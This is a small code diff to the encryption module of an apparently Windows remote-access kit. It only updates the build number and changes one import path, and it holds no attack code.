@@ -10,10 +10,10 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.2
+# Build:  1.0.21
 # -------------------------------------------------------------
 from cryptography.fernet import Fernet
-from ..logging.logging import NetworkingConfigs
+from core.logging.logging import NetworkingConfigs
 
 class Encryption:
     # Function will generate a new encryption key and return it
